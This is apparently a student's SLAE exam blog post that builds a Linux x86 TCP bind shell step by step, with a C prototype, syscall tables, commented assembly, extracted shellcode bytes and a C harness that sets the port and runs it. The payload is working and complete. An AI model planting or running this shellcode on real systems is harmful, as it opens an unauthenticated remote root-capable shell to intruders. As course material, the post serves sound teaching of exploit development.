# Assignment 1 - TCP Bind Shell

Hello! Thanks for stopping by! I'm just sipping on an incredible V60-pourover of some **Monticello Sunrise** (_Medium, Ethiopia_) roasted by my great friends over at CommonWealth Joe's coffeeshop. I've had a great time taking SecurityTube's course, Securitytube Linux Assembly Expert (SLAE). It's refreshed a lot of what I've forgotten, as well as taught me a lot about hand-writing shellcode in x86 assembly. And now it's time for me to prove my worth!

The exam is an open format that requires the test taker to blog each answer of the 7-part test. The instructor feels that this allows the security community to better develop in the areas being blogged about. Originality is a must when it comes to this, so I've strived to not view any other posts prior to posting my own. So, without further ado, let's jump in!

## Problem Statement

* Create a Shell_Bind_TCP shellcode
  - Binds to a port
  - Execs Shell on incoming connection
* Port number should be easily configurable

## Forming a Base

Let's start off by writing our own C program to do what we want:

**_assignment1.c_**

```c
#include <unistd.h> // dup2, execve
#include <netinet/in.h> // socket structures and constants

#define PORT 4444

int main() {
  int sockfd, clientfd;
  struct sockaddr_in bind_addr;


  // CREATE SOCKET
  // create a new socket  (ipv4, tcp)
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


  // BIND TO ADDRESS
  // create the address to bind to
  bind_addr.sin_family = AF_INET; // ipv4
  bind_addr.sin_port = htons(PORT); // port in the correct endianness
  bind_addr.sin_addr.s_addr = INADDR_ANY; // NULL (0.0.0.0)

  // Bind to the specified address (0.0.0.0:4444)
  bind(sockfd, (struct sockaddr*) &bind_addr, sizeof(bind_addr));


  // LISTEN FOR CONNECTIONS
  // Listen for connections on this tcp socket
  listen(sockfd, 0);


  // ACCEPT CONNECTIONS
  // Accept connection on listening socket and save the new socket fd (client)
  clientfd = accept(sockfd, NULL, NULL);


  // CHANGE STD FILE DESCRIPTORS
  // Overwrite old stdin, stdout, stderr fd's with the client socket fd
  dup2(clientfd, 0); // stdin
  dup2(clientfd, 1); // stdout
  dup2(clientfd, 2); // stderr


  // EXECVE SHELL
  // Execute the new program /bin/sh, which will now use the client socket to
  //  handle it's stdin, stdout, and stderr
  execve("/bin/sh", NULL, NULL);


  // EXIT
  // This will never happen because execve closes out for us.
  return 0;
}
```

Running this through libemu was not very fruitful, and getting it to work would be slightly out of scope (and unnecessary) for this assignment. So, we'll move on to doing some research on how to make all of these same function calls in assembly.  


## Initial Research

#### Syscalls

We need to know how to make the following system calls based on our C code above:
```
socket
bind
listen
accept
dup2
execve
```

To find the syscall numbers, we'll look in the `unistd_32.h` header file located, on my system, at `/usr/include/i386-linux-gnu/asm/unistd_32.h`. Upon searching through this file, we now have a table we can use to call any function we'll need for this assignment.


**_Syscall Numbers_**

| Function  | Decimal   | Hex       |
| --------  | --------- | --------- |
| socket    | 359       | 0x167     |
| bind      | 361       | 0x169     |
| listen    | 363       | 0x16b     |
| accept4 | 364       | 0x16c     |
| dup2      | 63        | 0x3f      |
| execve    | 11        | 0xb       |


**_ACCEPT vs. ACCEPT4_**

Above you'll notice I'm using the `accept4` call instead of `accept`. That's because this is the syscall I found when looking in the above mentioned file. This caused me quite the headache, because at first I thought I was using `accept`. It ran fine as compiled assembly, but bombed out when running as shellcode inside the C program. It wasn't until I `strace`'d the C program that I realized `accept4` was being called, which uses an extra flags argument. You can read more at `man 2 accept`.

#### Constant Definitions

We also need to figure out what the values of all the constants are in the C program we wrote. To do this, I will use grep to search for the constant I'm looking for in the `/usr/include` folder, and then open the file returned if I need to see more. Below are the results, and the files we found them in.

**_Constants_**

| Constant    | Decimal Value | Location                                       |
| --------    | ------------- | ---------------------------------------------- |
| AF_INET     | PF_INET       | /usr/include/i386-linux-gnu/bits/socket.h      |
| PF_INET     | 2             | /usr/include/i386-linux-gnu/bits/socket.h      |
| SOCK_STREAM | 1             | /usr/include/i386-linux-gnu/bits/socket_type.h |
| IPPROTO_TCP | 6             | /usr/include/linux/netinet/in.h                |
| sockaddr_in | See File      | /usr/include/linux/netinet/in.h                |
| INADDR_ANY  | 0x00000000    | /usr/include/linux/netinet/in.h                |

With this information, we have all of the information we need to successfully rewrite the C code as x86 assembly.


## The Final Product

**_assignment1.asm_**

```asm
; Filename: assignment1.nasm
; Author:  Adam Brown
; Website:  https://coffeegist.com
;
;
; Purpose: Create TCP Bind Shell for SLAE Exam, Assignment 1

global _start

section .text
_start:

  ; Clear out registers before we get started
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  mul ebx ; zero out eax


; CREATE SOCKET
; int socket(int domain, int type, int protocol) //
; syscall number: 359 (0x167)
;
; Argument Values:
; EBX -> domain = 2 (AF_INET/IPv4)
; ECX -> type = 1 (SOCK_STREAM/TCP)
; EDX -> protocol = 6 (IPPROTO_TCP)
;
; Note: For protocol, we could also use 0, as the man page for socket tells us,
; "Normally only a single protocol exists to support a particular socket type
;   within a given protocol family, in which case protocol can be specified
;   as 0."

  mov bl, 2
  mov cl, 1
  mov dl, 6
  mov ax, 0x167
  int 0x80


; BIND TO ADDRESS
; int bind (int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; syscall number: 361 (0x169)
;
; Argument Values:
; sockfd = value in eax returned by socket()
; *addr = memory address of structure containing:
;   - sin_family: 0x0002 (AF_INET/IPv4)
;   - sin_port: 0x115c (4444)
;   - sin_addr.s_addr: 0x00000000 (0.0.0.0)
; addrlen = 0x10 (16/sizeof(sockaddr_in))

  xor edx, edx
  mov ebx, eax ; mov sockfd value into ebx
  push edx ; push 0x00000000 for sin_addr.s_addr
  push word 0x5c11 ; push 0x115c for sin_port
  push word 0x02 ; push 0x0002 for sin_family
  mov ecx, esp ; memory pointer to our sockaddr struct
  mov dl, 0x10
  mov ax, 0x169
  int 0x80


; LISTEN FOR CONNECTIONS
; int listen(int sockfd, int backlog);
; syscall number: 363 (0x16b)
;
; Argument Values:
; sockfd = value in ebx
; backlog = 0

  xor ecx, ecx
  mov ax, 0x16b
  int 0x80


; ACCEPT CONNECTIONS
; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
; syscall number: 364 (0x16c)
;
; Argument Values:
; sockfd = value in ebx
; *sockaddr = NULL (0x00)
; *addrlen = NULL (0x00)
; flags = NULL

  xor esi, esi
  xor edx, edx
  mov ax, 0x16c
  int 0x80


; CHANGE STD FILE DESCRIPTORS
; int dup2(int oldfd, int newfd);
; syscall number: 63 (0x3f)
;
; Argument Values:
; oldfd = value in eax returned by accept()
; newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

  mov ebx, eax ; preserve clientfd from ACCEPT call
  mov cl, 3 ; 3 file descriptors (stdin, stdout, stderr)

dup_descriptors:
  dec cl ; hack for loop to work with values 2,1,0 instead of 3,2,1
  mul edx ; zero out eax
  mov al, 0x3f
  int 0x80 ; dup2 stdin
  inc cl ; hack for loop to work with values 2,1,0 instead of 3,2,1
  loop dup_descriptors


; EXECVE SHELL
; int execve(const char *filename, char *const argv[], char *const envp[]);
; syscall number: 11 (0xb)
;
; Argument Values:
; *filename = Memory address of a null terminated string "/bin/sh"
; *argv[] = [*"/bin/sh", 0x00000000]
; *envp = NULL

  xor ecx, ecx

  ; This has to be pushed in reverse because of how things move to the stack
  ; Pushing /bin/sh null terminated string
  push cx
  push dword 0x68732f2f ; push / / s h
  push dword 0x6e69622f ; push / b i n

  mov ebx, esp ; Store pointer to "/bin/sh" in ebx
  push ecx ; Push NULL
  push ebx ; Push *filename
  mov ecx, esp ; Store memory address pointing to memory address of "/bin/sh"
  mov al, 0xb
  int 0x80 ; Execute SHELL


; EXIT
  xor eax, eax
  mov al, 1;
  int 0x80;
```

**_Getting the Shellcode_**

```bash
root@kali:~/courses/slae/exam# nasm -f elf32 -o assignment1.o assignment1.nasm
root@kali:~/courses/slae/exam# ld -o assignment1 assignment1.o

root@kali:~/courses/slae/exam# objdump -d ./assignment1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xdb\x31\xc9\x31\xd2\xf7\xe3\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd
\x80\x31\xd2\x89\xc3\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8
\x69\x01\xcd\x80\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xf6\x31\xd2\x66\xb8\x6c
\x01\xcd\x80\x89\xc3\xb1\x03\xfe\xc9\xf7\xe2\xb0\x3f\xcd\x80\xfe\xc1\xe2\xf4
\x31\xc9\x66\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89
\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
```


**_shellcode.c_**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>

#define PORT_OFFSET 27

int main(int argc, char* argv[]) {
    unsigned char shellcode[] = \
    "\x31\xdb\x31\xc9\x31\xd2\xf7\xe3\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01
    \xcd\x80\x31\xd2\x89\xc3\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10
    \x66\xb8\x69\x01\xcd\x80\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xf6\x31\xd2
    \x66\xb8\x6c\x01\xcd\x80\x89\xc3\xb1\x03\xfe\xc9\xf7\xe2\xb0\x3f\xcd\x80
    \xfe\xc1\xe2\xf4\x31\xc9\x66\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
    \x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

    if (argc > 1) {
        unsigned short porti = htons(atoi(argv[1]));
        memcpy(&shellcode[PORT_OFFSET], &porti, 2);
    } else {
        printf("Please enter a port number!\n");
        printf("Usage: %s <port>\n\n", argv[0]);
        return -1;
    }

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;

    ret();
}
```


**_Running our Shellcode_**

```bash
root@kali:~/courses/slae/exam# gcc shellcode.c -o shellcode

root@kali:~/courses/slae/exam# ./shellcode 4444
Shellcode Length:  106

```

## Wrap-Up

And that's a wrap! We now have shellcode successfully listening on port 4444! This was a fantastic challenge, and it finally taught me to use _strace_ like I should have been doing my whole life! I hope you learned a lot with me on this journey, and I look back to seeing you here next time! Happy hacking!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
